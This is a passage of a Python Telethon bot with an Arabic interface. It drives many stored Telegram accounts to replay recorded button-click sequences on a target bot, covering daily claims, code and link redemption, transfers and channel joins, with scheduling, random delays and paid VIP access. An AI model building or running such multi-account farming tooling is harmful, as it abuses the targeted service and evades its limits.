                                    self.operation_data[user_id] = {"saved_path": [], "amount": "", "link": "", "code": "", "description": "", "requires_amount": False, "requires_link": False}
                                self.operation_data[user_id]["saved_path"].append(idx)
                                await self.record_path_continue(event, user_id)
                                
                            except Exception as e:
                                await event.respond(f"❌ **فشل الضغط على الزر:** {str(e)}")
                                try:
                                    await client.send_message(TARGET_BOT, str(idx))
                                    await event.respond(f"✅ **تم إرسال {idx} كرسالة**")
                                    await asyncio.sleep(2)
                                    await self.record_path_continue(event, user_id)
                                except:
                                    await event.respond("❌ **فشل كل المحاولات**")
                        else:
                            await event.respond("❌ **الرسالة ما فيها أزرار**")
                    else:
                        await event.respond("❌ **ماكو رسالة**")
                else:
                    await event.respond("❌ **العميل غير موجود**")
            else:
                await event.respond(f"❌ **اختر رقماً بين 0 و {len(btns)-1}**")
        except ValueError:
            await event.respond("❌ **أدخل رقماً صحيحاً**")
    
    # ================ معالج الأزرار الرئيسي ================
    
    async def handle_callback(self, event):
        """معالج الأزرار"""
        data = event.data.decode()
        user_id = event.sender_id
        
        if data == "back_main":
            if user_id in self.user_clients:
                try:
                    await self.user_clients[user_id].disconnect()
                except:
                    pass
                del self.user_clients[user_id]
            await self.clear_user_state(user_id)
            await self.show_main_menu(event)
        
        elif data == "refresh":
            await self.show_main_menu(event)
        
        elif data == "accounts_menu":
            await self.show_accounts_menu(event)
        
        elif data == "add_account":
            await self.add_account_start(event)
        
        elif data == "delete_account":
            await self.delete_account_start(event)
        
        elif data == "back_accounts":
            await self.show_accounts_menu(event)
        
        elif data.startswith("del_acc_"):
            index = int(data.split("_")[2])
            await self.delete_account_confirm(event, index)
        
        elif data == "refresh_accounts":
            await event.answer(f"✅ تم التحديث: {len(self.sessions_list)} حساب", alert=True)
            await self.show_accounts_menu(event)
        
        elif data == "execute_options":
            await self.show_execute_options(event)
        
        elif data == "execute_new":
            await self.record_path_start(event)
        
        elif data == "execute_by_path":
            await self.execute_by_path_start(event)
        
        elif data == "daily_path":
            await self.execute_daily_path(event)
        
        elif data == "code_path":
            await self.execute_code_path(event)
        
        elif data == "link_path":
            await self.execute_link_path(event)
        
        elif data == "transfer_path":
            await self.execute_transfer_path(event)
        
        elif data == "repeat_last":
            if user_id in self.operation_data:
                await self.execute_start(event)
            else:
                await event.answer("❌ لا توجد عملية سابقة", alert=True)
        
        elif data.startswith("execpath_"):
            path_name = data[9:]
            await self.execute_saved_path(event, path_name)
        
        elif data == "speed_menu":
            await self.show_speed_menu(event)
        
        elif data.startswith("speed_"):
            if data == "speed_custom":
                await self.set_user_state(user_id, "waiting_speed_custom", {})
                await event.edit("⚡ **أدخل قيمة السرعة (1-100):**", buttons=self.create_buttons([[{"text": "🔙 إلغاء", "data": "speed_menu"}]]))
            else:
                speed = int(data.split("_")[1])
                set_speed(speed)
                await event.answer(f"✅ تم تعيين السرعة إلى {speed}", alert=True)
                await self.show_speed_menu(event)
        
        elif data == "add_admin":
            await self.add_admin(event)
        
        elif data == "del_admin":
            await self.del_admin(event)
        
        elif data == "clear_channels":
            await self.clear_all_channels(event)
        
        elif data == "copynum":
            await self.create_backup(event)
        
        elif data == "delall":
            await self.delete_all_accounts(event)
        
        elif data == "organize_account":
            await self.organize_account(event)
        
        elif data.startswith("organize_"):
            index = int(data.split("_")[1])
            await self.organize_selected_account(event, index)
        
        elif data == "join_channel":
            await self.join_channel(event)
        
        elif data == "premium_link":
            await self.detect_premium_link(event)
        
        elif data == "paths_menu":
            await self.show_paths_menu(event)
        
        elif data == "view_path":
            await self.view_path(event)
        
        elif data == "delete_path":
            await self.delete_path_list(event)
        
        elif data.startswith("view_path_details:"):
            path_name = data.split(":", 1)[1]
            await self.view_path_details(event, path_name)
        
        elif data.startswith("delpath_"):
            path_name = data[8:]
            if delete_path(path_name):
                await event.answer(f"✅ تم حذف {path_name}", alert=True)
            else:
                await event.answer("❌ فشل الحذف", alert=True)
            await self.show_paths_menu(event)
        
        elif data == "back_paths":
            await self.show_paths_menu(event)
        
        elif data == "schedule_task_menu":
            await self.schedule_task_menu(event)
        
        elif data == "schedule_new":
            await self.schedule_new_start(event)
        
        elif data.startswith("schedule_select_path:"):
            path_name = data.split(":", 1)[1]
            await self.schedule_select_path(event, path_name)
        
        elif data.startswith("schedule_duration:"):
            parts = data.split(":")
            path_name = parts[1]
            days = int(parts[2])
            time_str = parts[3]
            await self.schedule_set_duration(event, path_name, days, time_str)
        
        elif data.startswith("schedule_custom:"):
            parts = data.split(":")
            path_name = parts[1]
            time_str = parts[2]
            await self.schedule_set_custom(event, path_name, time_str)
        
        elif data.startswith("schedule_create:"):
            parts = data.split(":")
            path_name = parts[1]
            days = int(parts[2])
            time_str = parts[3]
            daily_count = parts[4]
            interval = parts[5]
            random_delay = parts[6]
            await self.schedule_create_task(event, path_name, days, time_str, daily_count, interval, random_delay)
        
        elif data.startswith("cancel_task:"):
            task_id = data.split(":", 1)[1]
            await self.cancel_task_by_id(event, task_id)
        
        elif data == "my_scheduled_tasks":
            await self.show_scheduled_tasks(event)
        
        elif data == "cancel_scheduled_task":
            await self.cancel_scheduled_task(event)
        
        elif data == "monitor_status":
            await self.monitor_status(event)
        
        elif data == "stats":
            await self.show_stats(event)
        
        elif data == "settings":
            await self.show_settings_menu(event)
        
        elif data == "admin_panel_home":
            await self.show_admin_panel(event)
        
        elif data == "toggle_mode":
            await self.toggle_bot_mode(event)
        
        elif data == "manage_vip":
            await self.manage_vip(event)
        
        elif data == "add_vip":
            await self.add_vip_start(event)
        
        elif data == "add_vip_hours":
            await self.add_vip_unit(event, data)
        
        elif data == "add_vip_days":
            await self.add_vip_unit(event, data)
        
        elif data == "toggle_trial":
            await self.toggle_trial(event)
        
        elif data == "set_trial_duration":
            await self.set_trial_duration(event)
        
        elif data == "myadminsecho":
            await self.manage_admins(event)
        
        elif data == "addadminecho":
            await self.add_admin_start(event)
        
        elif data == "deladminecho":
            await self.del_admin_start(event)
        
        elif data.startswith("setlimt:"):
            admin = data.split(":", 1)[1]
            await self.set_admin_limit(event, admin)
        
        elif data == "admin_stats":
            await self.show_admin_stats(event)

# ==================== دوال مساعدة ====================

def set_speed(speed_value):
    try:
        speed = int(speed_value)
        if speed < 1:
            speed = 1
        if speed > 100:
            speed = 100
        
        speed_config["speed_value"] = speed
        speed_config["click_delay"] = max(0.5, 3 - (speed / 50))
        speed_config["message_delay"] = max(1, 4 - (speed / 33))
        speed_config["between_accounts"] = max(2, 20 - (speed / 5))
        speed_config["cycle_delay"] = max(10, 60 - (speed / 2))
        
        return True
    except:
        return False

def load_detected_codes():
    if os.path.exists(CODES_FILE):
        try:
            with open(CODES_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {"codes": [], "links": []}
    return {"codes": [], "links": []}

def save_detected_codes(data):
    with open(CODES_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# ==================== تشغيل البوت ====================

async def main():
    bot = M6Bot()
    await bot.start()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[yellow]👋 تم إيقاف البوت[/yellow]")
    except Exception as e:
        console.print(f"[red]❌ خطأ: {str(e)}[/red]")